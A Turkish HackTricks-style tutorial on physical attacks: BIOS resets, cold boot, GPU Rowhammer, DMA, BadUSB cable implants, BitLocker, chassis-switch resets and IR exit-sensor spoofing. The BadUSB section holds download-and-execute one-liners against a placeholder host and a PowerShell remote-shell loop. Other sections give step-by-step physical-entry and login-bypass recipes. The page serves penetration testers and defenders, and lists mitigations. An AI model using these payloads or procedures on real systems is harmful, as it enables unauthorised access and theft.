# Fiziksel Saldırılar

{{#include ../banners/hacktricks-training.md}}

## BIOS Parola Kurtarma ve Sistem Güvenliği

Eski PC firmware ayarları, CMOS pilinin çıkarılması veya belgelenmiş bir clear-CMOS jumper'ının kullanılmasıyla sıfırlanabilir. Gerekli güç kesme süresi karta özeldir ve modern UEFI parolaları veya anahtarları nonvolatile flash bellekte, bir embedded controller'da ya da bir güvenlik aygıtında bulunabilir; bu nedenle pilin çıkarılmasından sonra da kalabilir. Pinleri kısa devre etmeden önce kart/service manual'ına başvurun; bu işlem ayrıca TPM ölçümlerini geçersiz kılabilir ve disk şifreleme kurtarmasını tetikleyebilir.

Eski x86 sistemlerde **killCMOS** ve **CmosPwd** gibi araçlar, boot edilebilir bir ortamdan CMOS destekli ayarları inceleyebilir veya değiştirebilir. CmosPwd, belgelenmiş eski BIOS aileleri kümesindeki parola formatlarını tanır ve CMOS durumunu yedekleyebilir, geri yükleyebilir veya silebilir/kill edebilir; yayımlanmış build'leri eski DOS/Windows, Linux, FreeBSD ve NetBSD ortamlarını hedefler.<sup>[[18]](#references)</sup> Bu yardımcı programlar genel amaçlı UEFI parola kaldırıcıları değildir ve yeterli donanım/firmware erişimi gerektirir.

Bazı laptop firmware'leri, birkaç başarısız parola denemesinden sonra vendor'a özgü bir challenge code görüntüler. [bios-pw.org](https://bios-pw.org) gibi veritabanları bazı modeller için eski vendor recovery password'larını türetebilir, ancak birçok sistem türetilebilir bir challenge olmadan lockout uygular. Oluşturulan her parolayı modele özgü kabul edin ve kalıcı deneme sayaçlarını tüketmekten kaçının.

### UEFI Güvenliği

Modern **UEFI** sistemlerde CHIPSEC, Secure Boot variable korumalarını audit edebilir. Aşağıdaki modifying olmayan check ile başlayın; isteğe bağlı `-a modify` modu kasıtlı olarak variable'ları bozmaya çalışır ve yalnızca kurtarılabilir bir lab sisteminde kullanılmalıdır. CHIPSEC, privileged driver'ının ve düşük seviyeli donanım erişiminin production endpoint'leri için uygun olmadığı konusunda kendisi uyarır.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## RAM Analizi ve Cold Boot Saldırıları

DRAM, refresh durduğunda her biti anında kaybetmez. Decay rate, modül teknolojisine ve sıcaklığa göre önemli ölçüde değişir; soğutma, kullanılabilir verileri soğutulmamış bir power cycle işleminden çok daha uzun süre koruyabilir. Bir cold-boot attack, küçük bir acquisition environment'a hızlı şekilde yeniden boot eder veya soğutulmuş bir modülü aktarır, raw memory'yi yakalar ve bit decay'e rağmen cryptographic key'leri yeniden oluşturur. Bir disk-copy utility otomatik olarak physical-memory imager değildir ve Volatility acquisition işlemi yapmak yerine bir capture'ı analiz eder; platforma uygun, doğrulanmış bir acquisition tool kullanın.<sup>[[12]](#references)</sup>

---

## Page Table'larına Karşı GPU Rowhammer

Modern GPU Rowhammer saldırıları, normal buffer'lar yerine **GPU virtual-memory metadata**'sını hedeflediğinde çok daha kullanışlı hale gelir. **GDDR6 NVIDIA Ampere GPU**'ları üzerine yapılan güncel çalışmalar, unprivileged CUDA code çalıştıran bir attacker'ın GPU'ya özgü hammering pattern'leri oluşturabildiğini, paging structure'ları vulnerable row'lara yerleştirmek için **memory massaging** kullanabildiğini ve ardından **last-level page table** veya bir intermediate **page directory** içindeki bit'leri flip edebildiğini gösterir. Tek bir translation entry bozulduğunda attacker, **arbitrary GPU memory read/write** yeteneğini elde edebilir ve ardından host compromise'a geçiş yapabilir.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6'da **hammerable row**'ları profilleyin ve in-DRAM mitigation'ları aşan refresh-aware / non-uniform hammering pattern'leri oluşturun.
2. Driver'ın page-translation structure'larını varsayılan protected pool'da tutmak yerine hammerable physical location'lara yerleştirmesi için **GPU allocation**'larını massage edin. Uygulamada bu, low-memory page-table region'ını tüketmeyi ve controlled stride'larla büyük sparse UVM mapping'leri spray etmeyi içerebilir.
3. Bir page-table / page-directory entry içindeki **PFN** veya aperture-related bit'ler gibi **translation metadata**'yı flip ederek attacker-controlled virtual page'in page-table page'lerine, arbitrary GPU memory'ye veya host-visible system mapping'lerine çözülmesini sağlayın.
4. Forged mapping'i yeniden kullanarak ek translation entry'lerini yeniden yazın ve GPU context'leri genelinde **arbitrary GPU memory read/write** yeteneğine yükselin.

### Host Pivot ve Mitigations

- **IOMMU disabled** olduğunda forged system-aperture mapping'leri arbitrary **host physical memory**'yi GPU'ya açabilir ve GPU primitive'ini full host compromise'a dönüştürebilir.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** last-level page-table entry'lerini hedeflerken **GeForge**, bir page-directory level'ını bozmanın daha kolay olabileceğini gösterir; çünkü tek bir bit flip daha büyük bir translation subtree'yi yeniden hedefleyebilir. Yalnızca tek bir paging layer'ını security-critical olarak değerlendirmeyin.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** hâlâ önemlidir; çünkü GDDRHammer/GeForge tarafından kullanılan doğrudan arbitrary-host-memory path'ini engeller, ancak **complete mitigation** değildir. **GPUBreach**, attacker'ın GPU-writable, driver-owned CPU buffer'larını bozduğu ve ardından NVIDIA driver memory-safety bug'larını tetikleyerek IOMMU enabled olsa bile kernel write primitive ve bir **root shell** elde ettiği second-stage pivot'ı gösterir.<sup>[[3]](#references)</sup>
- Desteklenen workstation/server GPU'larında **system-level ECC** pratik bir hardening adımıdır. ECC bulunmayan consumer GPU'lar daha zayıf bir defense surface sunar.<sup>[[4]](#references)</sup>
- Bu saldırılar tamamen teorik değildir: **GeForge**, RTX 3060'da **1,171**, RTX A6000'de ise **202** bit flip bildirmiştir; bu sayılar çalışan bir host-privilege-escalation chain oluşturmak için yeterli olmuştur.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Saldırıları

Pre-boot IOMMU enforcement'ı downgrade edebilen ve bir Windows DMA chain'i etkinleştirebilen offline UEFI IFR/NVRAM patching için bkz.:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception**, FireWire ve erken Thunderbolt configuration'ları gibi interface'ler üzerinden **DMA-based memory acquisition and patching** işlemini ve historical login-bypass signature'larını gösterir. Bu durum basitçe “Windows 10'a karşı etkisiz” değildir: exploitability; interface'e, target build'e, IOMMU policy'ye, lock state'e ve Windows Kernel DMA Protection'ın desteklenip etkinleştirilip etkinleştirilmediğine bağlıdır. Windows 10 version 1803 ve sonrası, uyumlu platformlarda Kernel DMA Protection'ı kullanıma sundu ve attack surface'i önemli ölçüde değiştirdi.<sup>[[13]](#references)[[14]](#references)</sup>

---

## System Access için Live CD/USB

Şifrelenmemiş veya kilidi zaten açılmış bir Windows volume'ünde offline environment, **sethc.exe** veya **Utilman.exe** gibi accessibility binary'lerini **cmd.exe** ile değiştirebilir; ilgili logon-screen shortcut çalıştırıldığında bir SYSTEM command prompt elde edilir. **chntpw** gibi tool'lar local SAM account data'sını düzenleyebilir. Bu yöntemler kilitli bir BitLocker volume'ünü bypass etmez ve DPAPI/EFS ile korunan credential'lara zarar verebilir; forensic copy'leri ve backup'ları koruyun.

**Kon-Boot**, desteklenen Windows/macOS configuration'ları için commercial boot-time authentication-bypass tool'udur. Compatibility; OS'ye, firmware mode'a, Secure Boot'a ve disk-encryption setup'ına bağlıdır; BitLocker ile kilitlenmiş bir volume'ün şifresini çözmez.<sup>[[10]](#references)</sup>

---

## Windows Security Feature'larını Ele Alma

### Boot ve Recovery Shortcut'ları

- **Delete/Supr**, F2, F10 veya başka bir vendor key firmware setup'ı açabilir.
- **F8**, yalnızca bu path'in etkin kalmayı sürdürdüğü configuration'larda legacy Windows advanced boot option'larına girer; mevcut recovery entry'si değişiklik gösterir.
- **Shift** tuşunu basılı tutmak bazı configuration'larda Windows automatic logon'ı engelleyebilir; ancak policy/registry setting'leri bu davranışı devre dışı bırakabilir.<sup>[[17]](#references)</sup>

### BAD USB Device'ları

**USB Rubber Ducky** ve Teensy board'ları gibi device'lar trusted HID keyboard olarak enumerate olabilir ve predefined keystroke'lar inject edebilir. Payload başlangıçta logged-on session'ın privilege'larına ve desktop access'ine sahiptir; UAC prompt'ları, screen locking, keyboard layout, timing ve endpoint USB policy yine de onu sınırlar.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator veya backup privilege'ları, locked file'ların (örneğin **SAM** ve **SYSTEM**) acquire edilebilmesi için bir shadow copy oluşturabilir veya registry hive'larını kaydedebilir. Bu, bir privilege bypass değil, post-compromise collection technique'tir ve `diskshadow`/VSS ile registry-hive export event'leriyle ilişkilendirilmelidir.

## BadUSB / HID Implant Technique'leri

### Wi-Fi managed cable implant'ları

- **Evil Crow Cable Wind** gibi ESP32-S3 tabanlı implant'lar USB-A→USB-C veya USB-C↔USB-C cable'larının içine gizlenir, tamamen USB keyboard olarak enumerate olur ve C2 stack'ini Wi-Fi üzerinden sunar. Operator'ün yalnızca cable'a victim host üzerinden güç vermesi, `Evil Crow Cable Wind` adlı ve `123456789` password'lü bir hotspot oluşturması ve embedded HTTP interface'e ulaşmak için [http://cable-wind.local/](http://cable-wind.local/) (veya DHCP address'i) adresine browse etmesi gerekir.<sup>[[8]](#references)</sup>
- Browser UI; *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* ve *Config* tab'larını sunar. Stored payload'lar OS başına tag'lenir, keyboard layout'ları anında değiştirilir ve VID/PID string'leri bilinen peripheral'ları taklit edecek şekilde değiştirilebilir.
- C2 cable'ın içinde bulunduğundan bir phone, organization'ın network'ünü kullanmadan payload'ları stage edebilir, execution'ı trigger edebilir ve Wi-Fi credential'larını yönetebilir; bu, kısa dwell-time'lı physical intrusion'lar için kullanışlıdır.

### OS-aware AutoExec payload'ları

- AutoExec rule'ları, USB enumeration'dan hemen sonra çalıştırılacak bir veya daha fazla payload'ı bağlar. Implant, lightweight OS fingerprinting gerçekleştirir ve eşleşen script'i seçer.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) veya `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Execution unattended olduğundan, yalnızca bir charging cable'ı değiştirmek logged-on user context'i altında “plug-and-pwn” initial access elde edilmesini sağlayabilir.

### Wi-Fi TCP üzerinden HID-bootstrapped remote shell

1. **Keystroke bootstrap:** Stored payload bir console açar ve new USB serial device'a gelen her şeyi execute eden bir loop'u paste eder. Minimal bir Windows variant'ı şöyledir:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant, ESP32-S3'ü operatöre geri bağlanan bir TCP client (Python script'i, Android APK'sı veya desktop executable) başlatırken USB CDC channel'ını açık tutar. TCP session'a yazılan tüm byte'lar yukarıdaki serial loop'a iletilir; böylece air-gapped host'larda bile remote command execution sağlanır. Output sınırlıdır; bu nedenle operatörler genellikle blind commands (account creation, ek tooling'in staging edilmesi vb.) çalıştırır.

### HTTP OTA update surface

- Belgelenmiş Evil Crow Cable Wind interface'i, `/update` adresinde unauthenticated bir firmware-update endpoint'i sunar:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Saha operatörleri, müdahale sırasında özellikleri hot-swap yöntemiyle değiştirebilir (ör. flash USB Army Knife firmware'ini yükleyebilir); böylece implant kabloyu açmadan ve hedef host'a bağlı kalmaya devam ederken yeni yeteneklere geçiş yapabilir.

## BitLocker Encryption'ı Bypass Etme

Canlı veya yakın zamanda çalıştırılmış bir sistemin yetkili adli edinimi, birim kilidi açıkken bir BitLocker volume master key veya ilişkili key materyali içerebilir. Elcomsoft Forensic Disk Decryptor ve Passware Kit Forensic gibi ticari araçlar, desteklenen bellek imajlarını, hibernation dosyalarını veya crash dump'larını tarayabilir; ancak başarı garanti edilmez. Modern Windows, BitLocker etkin olduğunda crash dump'larını da şifreler ve depolanmış 48 haneli recovery password, bellekteki volume key'den farklı bir artefakttır.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Recovery Key Eklemek için Social Engineering

Bir saldırgan, bir yöneticiyi BitLocker yönetim komutlarını çalıştırmaya ikna ederek bir recovery-password, external-key veya başka bir protector ekleyebilir ve ardından bunu ele geçirebilir. Bir recovery password, sıfırlardan oluşan rastgele bir string olamaz: BitLocker numerical recovery password'ları doğrulanmış 48 haneli bir formata sahiptir. İlgili yetkili yönetim syntax'ı `manage-bde -protectors -add C: -recoverypassword` şeklindedir; ortaya çıkan protector'ları `manage-bde -protectors -get C:` ile listeleyin. Protector eklemelerini izleyin ve yeni recovery materyalinin yalnızca onaylanmış konumlara escrow edilmesini sağlayın.<sup>[[16]](#references)</sup>

---

## BIOS'u Factory-Reset Etmek için Chassis Intrusion / Maintenance Switch'lerini Exploit Etme

Modern laptop'ların ve small-form-factor desktop'ların çoğunda, Embedded Controller (EC) ve BIOS/UEFI firmware tarafından izlenen bir **chassis-intrusion switch** bulunur. Switch'in temel amacı, bir cihaz açıldığında uyarı vermek olsa da üreticiler bazen switch belirli bir düzende toggled edildiğinde tetiklenen **belgelenmemiş bir recovery shortcut** uygular.<sup>[[5]](#references)[[6]](#references)</sup>

### Attack Nasıl Çalışır

1. Switch, EC üzerindeki bir **GPIO interrupt**'ına bağlanmıştır.
2. EC üzerinde çalışan firmware, **basışların zamanlamasını ve sayısını** takip eder.
3. Hard-coded bir pattern tanındığında EC, **system NVRAM/CMOS içeriğini silen** bir *mainboard-reset* routine'ini çağırır.
4. Sonraki boot işleminde, etkilenen modeller resetlenmiş firmware state'i yükler. Üreticiye ve revision'a bağlı olarak silinen state; supervisor password'ü, özel boot ayarlarını veya kayıtlı Secure Boot key'lerini içerebilir; TPM state'i ve disk-encryption etkileri ayrıca değerlendirilmelidir.

> Bir firmware reset, external-boot seçeneklerini geri getirebilir; ancak storage'ın şifresini çözmez. BitLocker veya başka bir full-disk encryption sistemi, TPM/firmware değişikliklerinden sonra recovery moduna geçebilir ve recovery key olmadan dahili sürücüyü korumaya devam edebilir.<sup>[[16]](#references)</sup>

### Gerçek Dünya Örneği – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen) için recovery shortcut şöyledir:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Onuncu döngüden sonra EC, bir sonraki yeniden başlatmada BIOS'a NVRAM'i silmesini bildiren bir flag ayarlar. Tüm prosedür yaklaşık 40 s sürer ve **bir tornavidadan başka hiçbir şey gerektirmez**.<sup>[[5]](#references)</sup>

### Generic Exploitation Procedure

1. EC'nin çalışmasını sağlamak için hedefi açın veya askıya alıp devam ettirin.
2. Intrusion/maintenance switch'e erişmek için alt kapağı çıkarın.
3. Üreticiye özgü toggle pattern'i tekrarlayın (belgelere, forumlara başvurun veya EC firmware'ini reverse-engineer edin).
4. Cihazı yeniden monte edip reboot edin, ardından hangi firmware ayarlarının ve kimlik bilgilerinin gerçekten değiştiğini inceleyin.
5. Yetkiliyseniz ve harici boot kullanılabiliyorsa kontrollü bir live image ile boot edin. Dahili bir volume meşru biçimde unlock edildiğinde (veya hiç encrypted değilse), live environment credential ve data elde edebilir veya EFI System Partition'ı inceleyebilir. Bu partition'ı bir EFI implantı kurmak için değiştirmek kalıcı ve son derece müdahaleci bir işlemdir; ayrıca Secure Boot, measured boot, firmware write protection ve endpoint monitoring tarafından sınırlandırılmaya devam eder. Encrypted storage, anahtarı veya recovery material olmadan erişilemez durumda kalır.

### Detection & Mitigation

* OS management console'da chassis-intrusion event'lerini loglayın ve bunları beklenmeyen BIOS reset'leriyle ilişkilendirin.
* Açılmayı tespit etmek için vidalarda/kapaklarda **tamper-evident seals** kullanın.
* Cihazları **fiziksel olarak kontrol edilen alanlarda** tutun; physical access'in full compromise anlamına geldiğini varsayın.
* Mevcutsa üreticinin “maintenance switch reset” özelliğini devre dışı bırakın veya NVRAM reset'leri için ek bir cryptographic authorisation isteyin.

---

## No-Touch Exit Sensors'a Karşı Covert IR Injection

### Sensor Characteristics
- Commodity “wave-to-exit” sensors, near-IR LED emitter'ı yalnızca doğru carrier'ın (yaklaşık 30 kHz) birden fazla pulse'unu (yaklaşık 4–10) gördükten sonra logic high bildiren TV-remote tarzı bir receiver module ile eşleştirir.<sup>[[7]](#references)</sup>
- Plastik bir shroud, emitter ve receiver'ın doğrudan birbirine bakmasını engeller; bu nedenle controller, doğrulanmış herhangi bir carrier'ın yakındaki bir reflection'dan geldiğini varsayar ve door strike'ı açan bir relay'i çalıştırır.
- Controller bir target'ın mevcut olduğuna inandığında outbound modulation envelope'ü sıkça değiştirir, ancak receiver filtrelenmiş carrier ile eşleşen herhangi bir burst'ü kabul etmeye devam eder.

### Attack Workflow
1. **Emission profile'ı capture edin** – internal IR LED'i süren hem pre-detection hem de post-detection waveform'larını kaydetmek için controller pin'lerine bir logic analyser bağlayın.
2. **Yalnızca “post-detection” waveform'ını replay edin** – stock emitter'ı çıkarın veya yok sayın ve harici bir IR LED'i başlangıçtan itibaren zaten tetiklenmiş pattern ile sürün. Receiver yalnızca pulse count/frequency ile ilgilendiğinden spoofed carrier'ı genuine reflection olarak değerlendirir ve relay line'ını aktif eder.
3. **Transmission'ı gate edin** – receiver'ın AGC'sini veya interference handling logic'ini saturate etmeden minimum pulse count'u iletmek için carrier'ı ayarlanmış burst'ler halinde gönderin (ör. onlarca milisaniye açık, benzer süre kapalı). Continuous emission sensörün hassasiyetini hızla düşürür ve relay'in çalışmasını durdurur.

### Long-Range Reflective Injection
- Bench LED'i high-power IR diode, MOSFET driver ve focusing optics ile değiştirmek, yaklaşık 6 m mesafeden güvenilir triggering sağlar.
- Attacker'ın receiver aperture'ına line-of-sight sağlaması gerekmez; beam'i camdan görülebilen interior walls, shelving veya door frames'e yönlendirmek, reflected energy'nin yaklaşık 30° field of view'a girmesini ve yakın mesafeli bir hand wave'i taklit etmesini sağlar.
- Receiver'lar yalnızca weak reflections beklediğinden çok daha güçlü bir external beam birden fazla yüzeyden bounce edebilir ve yine de detection threshold'un üzerinde kalabilir.

### Weaponised Attack Torch
- Driver'ı commercial flashlight içine yerleştirmek tool'u plain sight'ta gizler. Visible LED'i receiver'ın bandıyla eşleşen high-power IR LED ile değiştirin, yaklaşık 30 kHz burst'leri üretmek için bir ATtiny412 (veya benzeri) ekleyin ve LED current'ı sink etmek için bir MOSFET kullanın.
- Telescopic zoom lens, range/precision için beam'i daraltırken MCU control altındaki bir vibration motoru visible light yaymadan modulation'ın aktif olduğuna dair haptic confirmation sağlar.
- Birkaç stored modulation pattern arasında geçiş yapmak (biraz farklı carrier frequencies ve envelopes), rebranded sensor families genelinde compatibility'yi artırır; böylece operator relay'in duyulabilir biçimde click etmesini ve door'un release olmasını sağlayana kadar reflective surfaces'ı tarayabilir.

---

## References

- [1] [GDDRHammer: Modern GPU'lardan Cross-Component Rowhammer Attacks ile DRAM Rows'u Greatly Disturb Etme](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GPU Page Tables'ı Fun and Profit için GDDR Memory'yi Hammering ile Forge Etme](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammer Kullanarak GPU'larda Privilege Escalation Attacks](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - Temmuz 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Covert IR Torch ile IR No-Touch Exit Sensors'ı Bypass Etme”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Evil Crow Cable Wind ile Hacking”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIA Chips'e Karşı Rowhammer Attack](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Encryption Keys'e Yönelik Cold Boot Attacks](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMA üzerinden physical memory manipulation](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
